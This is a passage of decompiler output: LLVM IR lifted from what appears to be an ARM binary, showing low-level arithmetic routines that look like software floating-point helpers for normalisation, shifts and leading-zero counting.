  %v2_1a658.off = add i32 %v2_1a658, 4194303
  %tmp = icmp ult i32 %v2_1a658.off, 2097152
  br i1 %tmp, label %.thread3, label %bb13

bb13:                                             ; preds = %bb12
  %v2_1a65c.off = add i32 %v2_1a65c, 4194303
  %tmp18 = icmp ult i32 %v2_1a65c.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb11, %bb12, %bb13
  %v0_1a678 = phi i1 [ true, %bb11 ], [ true, %bb12 ], [ %tmp18, %bb13 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_1a678, i32 ptrtoint (i32* @global_var_1a898.1394 to i32))
  %v0_1a67c = load i32, i32* %r4.global-to-local, align 4
  %v3_1a67c = udiv i32 %v0_1a67c, 2097152
  store i32 %v3_1a67c, i32* %r4.global-to-local, align 4
  %v1_1a680 = load i32, i32* %r5.global-to-local, align 4
  %v4_1a680 = udiv i32 %v1_1a680, 2097152
  %v5_1a680 = sub nsw i32 %v4_1a680, %v3_1a67c
  %v5_1a684 = icmp ult i32 %v4_1a680, %v3_1a67c
  br i1 %v5_1a684, label %bb14, label %bb15

bb14:                                             ; preds = %.thread3
  %v7_1a684 = sub nsw i32 0, %v5_1a680
  br label %bb15

bb15:                                             ; preds = %.thread3, %bb14
  %storemerge = phi i32 [ %v7_1a684, %bb14 ], [ %v5_1a680, %.thread3 ]
  %v1_1a6e4 = phi i32 [ %v7_1a684, %bb14 ], [ %v5_1a680, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_1a688 = icmp ugt i32 %v4_1a680, %v3_1a67c
  br i1 %v7_1a688, label %dec_label_pc_1a68c, label %dec_label_pc_1a6a8

dec_label_pc_1a68c:                               ; preds = %bb15
  %v2_1a68c = add nsw i32 %v1_1a6e4, %v3_1a67c
  store i32 %v2_1a68c, i32* %r4.global-to-local, align 4
  %v0_1a690 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a690 = load i32, i32* %r3.global-to-local, align 4
  %v0_1a694 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a694 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_1a690, i32* %r1.global-to-local, align 4
  store i32 %v1_1a694, i32* %r0.global-to-local, align 4
  store i32 %v0_1a690, i32* %r3.global-to-local, align 4
  store i32 %v0_1a694, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a6a8

dec_label_pc_1a6a8:                               ; preds = %bb15, %dec_label_pc_1a68c
  %v0_1a6e4 = phi i32 [ %v3_1a67c, %bb15 ], [ %v2_1a68c, %dec_label_pc_1a68c ]
  %tmp19 = icmp ugt i32 %v1_1a6e4, 54
  br i1 %tmp19, label %bb16, label %bb17

bb16:                                             ; preds = %dec_label_pc_1a6a8
  %v6_1a6ac = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_1a6ac, i32* %r4.global-to-local, align 4
  store i32 %v6_1a654, i32* %r5.global-to-local, align 4
  %v15_1a6ac = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v15_1a6ac

bb17:                                             ; preds = %dec_label_pc_1a6a8
  %v0_1a6b0 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a6b0 = icmp sgt i32 %v0_1a6b0, -1
  %v4_1a6bc = urem i32 %v0_1a6b0, 1048576
  %v5_1a6bc = or i32 %v4_1a6bc, 1048576
  store i32 %v5_1a6bc, i32* %r0.global-to-local, align 4
  br i1 %v3_1a6b0, label %dec_label_pc_1a6cc, label %dec_label_pc_1a6c4

dec_label_pc_1a6c4:                               ; preds = %bb17
  %v0_1a6c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a6c4 = sub i32 0, %v0_1a6c4
  store i32 %v1_1a6c4, i32* %r1.global-to-local, align 4
  %v2_1a6c4 = icmp eq i32 %v0_1a6c4, 0
  %v2_1a6c8 = icmp eq i1 %v2_1a6c4, false
  %v5_1a6c8 = sext i1 %v2_1a6c8 to i32
  %v6_1a6c8 = sub nsw i32 %v5_1a6c8, %v5_1a6bc
  store i32 %v6_1a6c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a6cc

dec_label_pc_1a6cc:                               ; preds = %bb17, %dec_label_pc_1a6c4
  %v0_1a6cc = load i32, i32* %r2.global-to-local, align 4
  %v3_1a6cc = icmp sgt i32 %v0_1a6cc, -1
  %v4_1a6d4 = urem i32 %v0_1a6cc, 1048576
  %v5_1a6d4 = or i32 %v4_1a6d4, 1048576
  store i32 %v5_1a6d4, i32* %r2.global-to-local, align 4
  br i1 %v3_1a6cc, label %dec_label_pc_1a6e4, label %dec_label_pc_1a6dc

dec_label_pc_1a6dc:                               ; preds = %dec_label_pc_1a6cc
  %v0_1a6dc = load i32, i32* %r3.global-to-local, align 4
  %v1_1a6dc = sub i32 0, %v0_1a6dc
  store i32 %v1_1a6dc, i32* %r3.global-to-local, align 4
  %v2_1a6dc = icmp eq i32 %v0_1a6dc, 0
  %v2_1a6e0 = icmp eq i1 %v2_1a6dc, false
  %v5_1a6e0 = sext i1 %v2_1a6e0 to i32
  %v6_1a6e0 = sub nsw i32 %v5_1a6e0, %v5_1a6d4
  store i32 %v6_1a6e0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a6e4

dec_label_pc_1a6e4:                               ; preds = %dec_label_pc_1a6cc, %dec_label_pc_1a6dc
  %v4_1a6e4 = icmp eq i32 %v0_1a6e4, %v1_1a6e4
  call void @__pseudo_cond_branch(i1 %v4_1a6e4, i32 ptrtoint (i32* @global_var_1a880.1395 to i32))
  %v1_1a6e8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1a6e8

; uselistorder directives
  uselistorder i32 %v0_1a6cc, { 1, 0 }
  uselistorder i32 %v0_1a6b0, { 1, 0 }
  uselistorder i32 %v4_1a680, { 2, 1, 0 }
  uselistorder i32 %v3_1a67c, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v1_1a664, { 1, 0 }
  uselistorder i32 %v2_1a65c, { 1, 3, 0, 2 }
  uselistorder i32 %v2_1a658, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 7, 6, 8, 0, 1, 2 }
  uselistorder label %dec_label_pc_1a6e4, { 1, 0 }
  uselistorder label %dec_label_pc_1a6cc, { 1, 0 }
  uselistorder label %dec_label_pc_1a6a8, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1a6ec() local_unnamed_addr {
dec_label_pc_1a6ec:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_1a6ec = load i32, i32* @r4, align 4
  %v1_1a6ec = add i32 %v0_1a6ec, -1
  store i32 %v1_1a6ec, i32* @r4, align 4
  %v0_1a6f0 = load i32, i32* @r5, align 4
  %v1_1a6f0 = sub i32 32, %v0_1a6f0
  %v5_1a6f4 = icmp sgt i32 %v0_1a6f0, 32
  br i1 %v5_1a6f4, label %dec_label_pc_1a710, label %dec_label_pc_1a6f8

dec_label_pc_1a6f8:                               ; preds = %dec_label_pc_1a6ec
  %v0_1a6f8 = load i32, i32* @r3, align 4
  %v6_1a6f8 = shl i32 %v0_1a6f8, %v1_1a6f0
  store i32 %v6_1a6f8, i32* %ip.global-to-local, align 4
  %v0_1a6fc = load i32, i32* @r1, align 4
  %v3_1a6fc = add i32 %v0_1a6f0, -1
  %v4_1a6fc = shl i32 1, %v3_1a6fc
  %v7_1a6fc = lshr i32 %v0_1a6f8, %v0_1a6f0
  %v8_1a6fc = add i32 %v0_1a6fc, %v7_1a6fc
  %v9_1a6fc = icmp ult i32 %v8_1a6fc, %v0_1a6fc
  %v0_1a700 = load i32, i32* @r0, align 4
  %v2_1a700 = zext i1 %v9_1a6fc to i32
  %v3_1a700 = add i32 %v2_1a700, %v0_1a700
  %v1_1a704 = load i32, i32* @r2, align 4
  %v7_1a704 = shl i32 %v1_1a704, %v1_1a6f0
  %v8_1a704 = add i32 %v7_1a704, %v8_1a6fc
  store i32 %v8_1a704, i32* %r1.global-to-local, align 4
  %v5_1a708 = and i32 %v1_1a704, %v4_1a6fc
  %v6_1a708 = icmp ne i32 %v5_1a708, 0
  %v7_1a708 = ashr i32 %v1_1a704, %v0_1a6f0
  %v9_1a708 = add i32 %v3_1a700, %v7_1a708
  %v10_1a708 = zext i1 %v6_1a708 to i32
  %v11_1a708 = add i32 %v10_1a708, %v9_1a708
  br label %dec_label_pc_1a72c

dec_label_pc_1a710:                               ; preds = %dec_label_pc_1a6ec
  %v1_1a710 = add i32 %v0_1a6f0, -32
  %v1_1a714 = add i32 %v1_1a6f0, 32
  %v0_1a71c = load i32, i32* @r2, align 4
  %v2_1a71c = add i32 %v1_1a6f0, 31
  %v3_1a71c = lshr i32 -2147483648, %v2_1a71c
  %v4_1a71c = and i32 %v0_1a71c, %v3_1a71c
  %v5_1a71c = icmp ne i32 %v4_1a71c, 0
  %v6_1a71c = shl i32 %v0_1a71c, %v1_1a714
  %v2_1a720 = or i32 %v6_1a71c, 2
  %v2_1a720.v6_1a71c = select i1 %v5_1a71c, i32 %v2_1a720, i32 %v6_1a71c
  store i32 %v2_1a720.v6_1a71c, i32* %ip.global-to-local, align 4
  %v0_1a724 = load i32, i32* @r1, align 4
  %v7_1a724 = ashr i32 %v0_1a71c, %v1_1a710
  %v8_1a724 = add i32 %v0_1a724, %v7_1a724
  store i32 %v8_1a724, i32* %r1.global-to-local, align 4
  %v0_1a728 = load i32, i32* @r0, align 4
  %v2_1a728 = and i32 %v0_1a71c, 1073741824
  %v3_1a728 = icmp ne i32 %v2_1a728, 0
  %v4_1a728 = ashr i32 %v0_1a71c, 31
  %v6_1a728 = add i32 %v0_1a728, %v4_1a728
  %v7_1a728 = zext i1 %v3_1a728 to i32
  %v8_1a728 = add i32 %v6_1a728, %v7_1a728
  br label %dec_label_pc_1a72c

dec_label_pc_1a72c:                               ; preds = %dec_label_pc_1a6f8, %dec_label_pc_1a710
  %storemerge = phi i32 [ %v11_1a708, %dec_label_pc_1a6f8 ], [ %v8_1a728, %dec_label_pc_1a710 ]
  %v0_1a72c = phi i32 [ %v11_1a708, %dec_label_pc_1a6f8 ], [ %v8_1a728, %dec_label_pc_1a710 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_1a72c = and i32 %v0_1a72c, -2147483648
  store i32 %v1_1a72c, i32* @r5, align 4
  %v1_1a730 = icmp sgt i32 %v0_1a72c, -1
  call void @__pseudo_cond_branch(i1 %v1_1a730, i32 ptrtoint (i32* @global_var_1a740.1396 to i32))
  %v0_1a734 = load i32, i32* %ip.global-to-local, align 4
  %v1_1a734 = sub i32 0, %v0_1a734
  store i32 %v1_1a734, i32* %ip.global-to-local, align 4
  %v2_1a734 = icmp eq i32 %v0_1a734, 0
  %v0_1a738 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a738 = icmp eq i1 %v2_1a734, false
  %v5_1a738 = sext i1 %v2_1a738 to i32
  %v6_1a738 = sub i32 %v5_1a738, %v0_1a738
  store i32 %v6_1a738, i32* @r1, align 4
  %v7_1a738 = zext i1 %v2_1a738 to i32
  %v8_1a738 = icmp ne i32 %v6_1a738, %v7_1a738
  %v9_1a738 = icmp ne i32 %v0_1a738, -1
  %v10_1a738 = or i1 %v9_1a738, %v8_1a738
  %v11_1a738 = icmp ne i32 %v0_1a738, 0
  %v12_1a738 = select i1 %v2_1a738, i1 %v10_1a738, i1 %v11_1a738
  %v0_1a73c = load i32, i32* %r0.global-to-local, align 4
  %v5_1a73c = sext i1 %v12_1a738 to i32
  %v6_1a73c = sub i32 %v5_1a73c, %v0_1a73c
  store i32 %v6_1a73c, i32* %r0.global-to-local, align 4
  ret i32 %v6_1a73c

; uselistorder directives
  uselistorder i1 %v2_1a738, { 1, 2, 0 }
  uselistorder i32 %v0_1a738, { 1, 2, 0 }
  uselistorder i32 %v8_1a728, { 1, 0 }
  uselistorder i32 %v0_1a71c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_1a708, { 1, 0 }
  uselistorder i32 %v1_1a704, { 1, 0, 2 }
  uselistorder i32 %v0_1a6fc, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1a72c, { 1, 0 }
}

define i32 @function_1a740(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1a740:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = trunc i64 %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_1a744 = icmp ult i32 %arg1, 1048574
  br i1 %v3_1a744, label %dec_label_pc_1a784, label %dec_label_pc_1a748

dec_label_pc_1a748:                               ; preds = %dec_label_pc_1a740
  %v3_1a74c = icmp ult i32 %arg1, 2097150
  br i1 %v3_1a74c, label %dec_label_pc_1a76c, label %dec_label_pc_1a750

dec_label_pc_1a750:                               ; preds = %dec_label_pc_1a748
  %v1_1a750 = urem i32 %arg1, 2
  %v2_1a750 = icmp ne i32 %v1_1a750, 0
  %v3_1a750 = udiv i32 %arg1, 2
  store i32 %v3_1a750, i32* %r0.global-to-local, align 4
  %v0_1a754 = load i32, i32* %r1.global-to-local, align 4
  %v3_1a754 = zext i1 %v2_1a750 to i32
  %v6_1a754 = zext i32 %v0_1a754 to i64
  %v7_1a754 = sub i32 33, %v0_1a754
  %v8_1a754 = zext i32 %v7_1a754 to i64
  %v9_1a754 = shl i64 %v6_1a754, %v8_1a754
  %v10_1a754 = sub i32 32, %v0_1a754
  %v11_1a754 = shl i32 %v3_1a754, %v10_1a754
  %v12_1a754 = zext i32 %v11_1a754 to i64
  %v14_1a754 = or i64 %v12_1a754, %v9_1a754
  %v15_1a754 = trunc i64 %v14_1a754 to i32
  %v16_1a754 = add i32 %v0_1a754, -1
  %v17_1a754 = shl i32 1, %v16_1a754
  %v18_1a754 = and i32 %v17_1a754, %v0_1a754
  %v19_1a754 = icmp ne i32 %v18_1a754, 0
  store i32 %v15_1a754, i32* %r1.global-to-local, align 4
  %v0_1a758 = load i32, i32* @ip, align 4
  %v3_1a758 = zext i1 %v19_1a754 to i32
  %v6_1a758 = zext i32 %v0_1a758 to i64
  %v7_1a758 = sub i32 33, %v0_1a758
  %v8_1a758 = zext i32 %v7_1a758 to i64
  %v9_1a758 = shl i64 %v6_1a758, %v8_1a758
  %v10_1a758 = sub i32 32, %v0_1a758
  %v11_1a758 = shl i32 %v3_1a758, %v10_1a758
  %v12_1a758 = zext i32 %v11_1a758 to i64
  %v14_1a758 = or i64 %v12_1a758, %v9_1a758
  %v15_1a758 = trunc i64 %v14_1a758 to i32
  store i32 %v15_1a758, i32* @ip, align 4
  %v0_1a75c = load i32, i32* @r4, align 4
  %v1_1a75c = add i32 %v0_1a75c, 1
  store i32 %v1_1a75c, i32* @r4, align 4
  %v3_1a760 = mul i32 %v1_1a75c, 2097152
  %v2_1a764 = icmp ugt i32 %v3_1a760, -4194305
  call void @__pseudo_cond_branch(i1 %v2_1a764, i32 ptrtoint (i32* @global_var_1a8f8.1397 to i32))
  br label %dec_label_pc_1a76c

dec_label_pc_1a76c:                               ; preds = %dec_label_pc_1a784, %dec_label_pc_1a748, %dec_label_pc_1a750
  %v0_1a76c = load i32, i32* @ip, align 4
  %v2_1a76c = icmp slt i32 %v0_1a76c, 0
  %v6_1a76c = icmp eq i32 %v0_1a76c, -2147483648
  %v1_1a770 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v6_1a76c, label %bb, label %dec_label_pc_1a76c._crit_edge

bb:                                               ; preds = %dec_label_pc_1a76c
  %v2_1a770 = urem i32 %v1_1a770, 2
  %v3_1a770 = icmp ne i32 %v2_1a770, 0
  br label %dec_label_pc_1a76c._crit_edge

dec_label_pc_1a76c._crit_edge:                    ; preds = %dec_label_pc_1a76c, %bb
  %v1_1a774 = phi i1 [ %v3_1a770, %bb ], [ %v2_1a76c, %dec_label_pc_1a76c ]
  %v2_1a774 = zext i1 %v1_1a774 to i32
  %v3_1a774 = add i32 %v2_1a774, %v1_1a770
  store i32 %v3_1a774, i32* %r1.global-to-local, align 4
  %v0_1a778 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a778 = load i32, i32* @r4, align 4
  %v2_1a778 = and i32 %v1_1a778, 4096
  %v3_1a778 = icmp ne i32 %v2_1a778, 0
  %v4_1a778 = mul i32 %v1_1a778, 1048576
  %v6_1a778 = add i32 %v4_1a778, %v0_1a778
  %v7_1a778 = zext i1 %v3_1a778 to i32
  %v8_1a778 = add i32 %v7_1a778, %v6_1a778
  %v1_1a77c = load i32, i32* @r5, align 4
  %v2_1a77c = or i32 %v1_1a77c, %v8_1a778
  store i32 %v2_1a77c, i32* %r0.global-to-local, align 4
  ret i32 %v2_1a77c

dec_label_pc_1a784:                               ; preds = %dec_label_pc_1a740
  %v0_1a784 = load i32, i32* @ip, align 4
  %v1_1a784 = icmp slt i32 %v0_1a784, 0
  %v2_1a784 = mul i32 %v0_1a784, 2
  store i32 %v2_1a784, i32* @ip, align 4
  %v0_1a788 = load i32, i32* %r1.global-to-local, align 4
  %v3_1a788 = mul i32 %v0_1a788, 2
  %v4_1a788 = zext i1 %v1_1a784 to i32
  %v5_1a788 = or i32 %v3_1a788, %v4_1a788
  store i32 %v5_1a788, i32* %r1.global-to-local, align 4
  %v9_1a788 = icmp ule i32 %v5_1a788, %v0_1a788
  %v10_1a788 = icmp ult i32 %v3_1a788, %v0_1a788
  %v11_1a788 = select i1 %v1_1a784, i1 %v9_1a788, i1 %v10_1a788
  %v3_1a78c = mul i32 %arg1, 2
  %v4_1a78c = zext i1 %v11_1a788 to i32
  %v5_1a78c = or i32 %v4_1a78c, %v3_1a78c
  store i32 %v5_1a78c, i32* %r0.global-to-local, align 4
  %v1_1a790 = and i32 %v3_1a78c, 1048576
  %v2_1a790 = icmp eq i32 %v1_1a790, 0
  %v0_1a794 = load i32, i32* @r4, align 4
  %v1_1a794 = add i32 %v0_1a794, -1
  store i32 %v1_1a794, i32* @r4, align 4
  br i1 %v2_1a790, label %bb7, label %dec_label_pc_1a76c

bb7:                                              ; preds = %dec_label_pc_1a784
  ret i32 %v5_1a78c

; uselistorder directives
  uselistorder i32 %v0_1a788, { 1, 2, 0 }
  uselistorder i1 %v1_1a784, { 1, 0 }
  uselistorder i32 %v1_1a770, { 1, 0 }
  uselistorder i32 %v0_1a76c, { 1, 0 }
  uselistorder i32 %v0_1a758, { 1, 0, 2 }
  uselistorder i32 %v0_1a754, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_1a76c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1a76c, { 0, 2, 1 }
}

define i32 @function_1a79c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1a79c:
  %v2_1a79c = icmp eq i32 %arg1, 0
  br i1 %v2_1a79c, label %bb35, label %bb

bb:                                               ; preds = %dec_label_pc_1a79c
  br label %.thread

bb35:                                             ; preds = %dec_label_pc_1a79c
  %v1_1a7a810 = load i32, i32* @r1, align 4
  store i32 0, i32* @r1, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb35
  %v0_1a804 = phi i32 [ %arg1, %bb ], [ %v1_1a7a810, %bb35 ]
  %v1_1a7bc = phi i32 [ 20, %bb ], [ 52, %bb35 ]
  %v2_1a7b4 = icmp ugt i32 %v0_1a804, 65535
  br i1 %v2_1a7b4, label %bb36, label %.thread3

bb36:                                             ; preds = %.thread
  %v2_1a7b8 = and i32 %v0_1a804, 32768
  %v3_1a7b8 = icmp eq i32 %v2_1a7b8, 0
  %v4_1a7b8 = udiv i32 %v0_1a804, 65536
  br i1 %v3_1a7b8, label %.thread3, label %bb37

bb37:                                             ; preds = %bb36
  %v2_1a7bc = add nsw i32 %v1_1a7bc, -16
  br label %.thread3

.thread3:                                         ; preds = %bb36, %.thread, %bb37
  %v1_1a7c8 = phi i32 [ %v1_1a7bc, %.thread ], [ %v1_1a7bc, %bb36 ], [ %v2_1a7bc, %bb37 ]
  %v1_1a7c4 = phi i32 [ %v0_1a804, %.thread ], [ %v4_1a7b8, %bb36 ], [ %v4_1a7b8, %bb37 ]
  %v2_1a7c0 = icmp ugt i32 %v1_1a7c4, 255
  br i1 %v2_1a7c0, label %bb38, label %.thread4

bb38:                                             ; preds = %.thread3
  %v2_1a7c4 = and i32 %v1_1a7c4, 128
  %v3_1a7c4 = icmp eq i32 %v2_1a7c4, 0
  %v4_1a7c4 = udiv i32 %v1_1a7c4, 256
  br i1 %v3_1a7c4, label %.thread4, label %bb39

bb39:                                             ; preds = %bb38
  %v2_1a7c8 = add nsw i32 %v1_1a7c8, -8
  br label %.thread4

.thread4:                                         ; preds = %bb38, %.thread3, %bb39
  %v1_1a7d4 = phi i32 [ %v1_1a7c8, %.thread3 ], [ %v1_1a7c8, %bb38 ], [ %v2_1a7c8, %bb39 ]
  %v1_1a7d0 = phi i32 [ %v1_1a7c4, %.thread3 ], [ %v4_1a7c4, %bb38 ], [ %v4_1a7c4, %bb39 ]
  %v2_1a7cc = icmp ugt i32 %v1_1a7d0, 15
  br i1 %v2_1a7cc, label %bb40, label %.thread5

bb40:                                             ; preds = %.thread4
  %v2_1a7d0 = and i32 %v1_1a7d0, 8
  %v3_1a7d0 = icmp eq i32 %v2_1a7d0, 0
  %v4_1a7d0 = udiv i32 %v1_1a7d0, 16
  br i1 %v3_1a7d0, label %.thread5, label %bb41

bb41:                                             ; preds = %bb40
  %v2_1a7d4 = add nsw i32 %v1_1a7d4, -4
  br label %.thread5

.thread5:                                         ; preds = %bb40, %.thread4, %bb41
  %v1_1a7dc = phi i32 [ %v1_1a7d4, %.thread4 ], [ %v1_1a7d4, %bb40 ], [ %v2_1a7d4, %bb41 ]
  %v1_1a7e4 = phi i32 [ %v1_1a7d0, %.thread4 ], [ %v4_1a7d0, %bb40 ], [ %v4_1a7d0, %bb41 ]
  %v2_1a7d8 = icmp ugt i32 %v1_1a7e4, 3
  br i1 %v2_1a7d8, label %bb42, label %.thread6

bb42:                                             ; preds = %.thread5
  %v2_1a7dc = add i32 %v1_1a7dc, -2
  br label %bb43

.thread6:                                         ; preds = %.thread5
  %v5_1a7e0 = udiv i32 %v1_1a7e4, 2
  %v6_1a7e0 = sub i32 %v1_1a7dc, %v5_1a7e0
  br label %bb43

bb43:                                             ; preds = %bb42, %.thread6
  %v0_1a7e4 = phi i32 [ %v6_1a7e0, %.thread6 ], [ %v2_1a7dc, %bb42 ]
  %v4_1a7e4 = udiv i32 %v1_1a7e4, 8
  %v5_1a7e4 = sub i32 %v0_1a7e4, %v4_1a7e4
  %v2_1a7e8 = add i32 %v5_1a7e4, -32
  %v4_1a7e8 = sub i32 31, %v5_1a7e4
  %v5_1a7e8 = and i32 %v4_1a7e8, %v5_1a7e4
  %v8_1a7e8 = icmp eq i32 %v5_1a7e4, 32
  %v6_1a7ec = icmp slt i32 %v5_1a7e4, 32
  br i1 %v6_1a7ec, label %dec_label_pc_1a7f0, label %dec_label_pc_1a810

dec_label_pc_1a7f0:                               ; preds = %bb43
  %v2_1a7f0 = add i32 %v5_1a7e4, -20
  %v7_1a7f4 = icmp sgt i32 %v2_1a7e8, -12
  br i1 %v7_1a7f4, label %dec_label_pc_1a7f8, label %dec_label_pc_1a80c

dec_label_pc_1a7f8:                               ; preds = %dec_label_pc_1a7f0
  %v1_1a7fc = sub i32 32, %v5_1a7e4
  %v6_1a800 = shl i32 %v0_1a804, %v5_1a7e4
  store i32 %v6_1a800, i32* @r1, align 4
  %v6_1a804 = lshr i32 %v0_1a804, %v1_1a7fc
  br label %.thread31

dec_label_pc_1a80c:                               ; preds = %dec_label_pc_1a7f0
  %v8_1a7f0 = icmp eq i32 %v2_1a7f0, 0
  %v4_1a7f0 = add i32 %v5_1a7e4, 2147483616
  %v5_1a7f0 = and i32 %v2_1a7f0, %v4_1a7f0
  br label %dec_label_pc_1a810

dec_label_pc_1a810:                               ; preds = %bb43, %dec_label_pc_1a80c
  %v1_1a81c.in = phi i32 [ %v2_1a7e8, %bb43 ], [ %v2_1a7f0, %dec_label_pc_1a80c ]
  %v6_1a81c = phi i32 [ %v2_1a7e8, %bb43 ], [ %v5_1a7e4, %dec_label_pc_1a80c ]
  %v2_1a81c.in = phi i32 [ %v5_1a7e8, %bb43 ], [ %v5_1a7f0, %dec_label_pc_1a80c ]
  %v0_1a81c = phi i1 [ %v8_1a7e8, %bb43 ], [ %v8_1a7f0, %dec_label_pc_1a80c ]
  %v1_1a81c = icmp slt i32 %v1_1a81c.in, 0
  %v2_1a81c = icmp slt i32 %v2_1a81c.in, 0
  %v3_1a810 = xor i1 %v2_1a81c, %v1_1a81c
  %v4_1a810 = or i1 %v0_1a81c, %v3_1a810
  br i1 %v4_1a810, label %bb44, label %bb45

bb44:                                             ; preds = %dec_label_pc_1a810
  %v6_1a810 = sub i32 32, %v6_1a81c
  store i32 %v6_1a810, i32* @ip, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_1a810, %bb44
  %v6_1a814 = shl i32 %v0_1a804, %v6_1a81c
  br i1 %v4_1a810, label %bb46, label %.thread31

bb46:                                             ; preds = %bb45
  %v6_1a818 = load i32, i32* @r1, align 4
  %v7_1a818 = load i32, i32* @ip, align 4
  %v12_1a818 = lshr i32 %v6_1a818, %v7_1a818
  %v13_1a818 = or i32 %v12_1a818, %v6_1a814
  %v11_1a81c = shl i32 %v6_1a818, %v6_1a81c
  store i32 %v11_1a81c, i32* @r1, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb45, %dec_label_pc_1a7f8, %bb46
  %v1_1a868 = phi i32 [ %v6_1a804, %dec_label_pc_1a7f8 ], [ %v13_1a818, %bb46 ], [ %v6_1a814, %bb45 ]
  %v0_1a820 = load i32, i32* @r4, align 4
  %v2_1a820 = sub i32 %v0_1a820, %v5_1a7e4
  %v5_1a824 = icmp slt i32 %v0_1a820, %v5_1a7e4
  br i1 %v5_1a824, label %bb48, label %bb47

bb47:                                             ; preds = %.thread31
  %v10_1a824 = mul i32 %v2_1a820, 1048576
  %v11_1a824 = add i32 %v10_1a824, %v1_1a868
  %v7_1a828 = load i32, i32* @r5, align 4
  %v8_1a828 = or i32 %v7_1a828, %v11_1a824
  ret i32 %v8_1a828

bb48:                                             ; preds = %.thread31
  %v2_1a834 = sub i32 -32, %v2_1a820
  %v6_1a838 = icmp sgt i32 %v2_1a820, -32
  br i1 %v6_1a838, label %dec_label_pc_1a83c, label %dec_label_pc_1a874

dec_label_pc_1a83c:                               ; preds = %bb48
  %v1_1a83c = add i32 %v2_1a834, 12
  %v8_1a840 = icmp sgt i32 %v1_1a83c, 0
  br i1 %v8_1a840, label %dec_label_pc_1a85c, label %dec_label_pc_1a844

dec_label_pc_1a844:                               ; preds = %dec_label_pc_1a83c
  %v1_1a844 = add i32 %v2_1a834, 32
  %v0_1a854 = load i32, i32* @r5, align 4
  %v7_1a854 = lshr i32 %v1_1a868, %v1_1a844
  %v8_1a854 = or i32 %v0_1a854, %v7_1a854
  ret i32 %v8_1a854

dec_label_pc_1a85c:                               ; preds = %dec_label_pc_1a83c
  %v0_1a86c = load i32, i32* @r5, align 4
  ret i32 %v0_1a86c

dec_label_pc_1a874:                               ; preds = %bb48
  %v0_1a878 = load i32, i32* @r5, align 4
  ret i32 %v0_1a878

; uselistorder directives
  uselistorder i32 %v2_1a820, { 1, 0, 2 }
  uselistorder i32 %v1_1a868, { 1, 0 }
  uselistorder i32 %v6_1a814, { 1, 0 }
  uselistorder i32 %v2_1a7e8, { 1, 0, 2 }
  uselistorder i32 %v5_1a7e4, { 5, 4, 6, 2, 7, 1, 3, 8, 9, 0, 11, 10 }
  uselistorder i32 %v4_1a7d0, { 1, 0 }
  uselistorder i32 %v1_1a7d0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a7c4, { 1, 0 }
  uselistorder i32 %v1_1a7c4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a7b8, { 1, 0 }
  uselistorder i32 %v0_1a804, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 -12, { 1, 2, 14, 15, 3, 17, 18, 4, 19, 20, 16, 13, 12, 11, 10, 9, 21, 22, 23, 5, 6, 7, 24, 8, 25, 26, 28, 29, 30, 27, 0 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -2, { 13, 7, 2, 4, 5, 3, 14, 6, 12, 8, 15, 17, 16, 18, 0, 9, 1, 10, 19, 11 }
  uselistorder i32 15, { 2, 3, 1, 6, 4, 9, 0, 5, 7, 8 }
  uselistorder i32 -8, { 7, 14, 15, 16, 17, 18, 19, 13, 12, 5, 11, 10, 9, 8, 20, 21, 22, 23, 6, 24, 25, 3, 0, 29, 26, 27, 28, 2, 30, 31, 4, 1 }
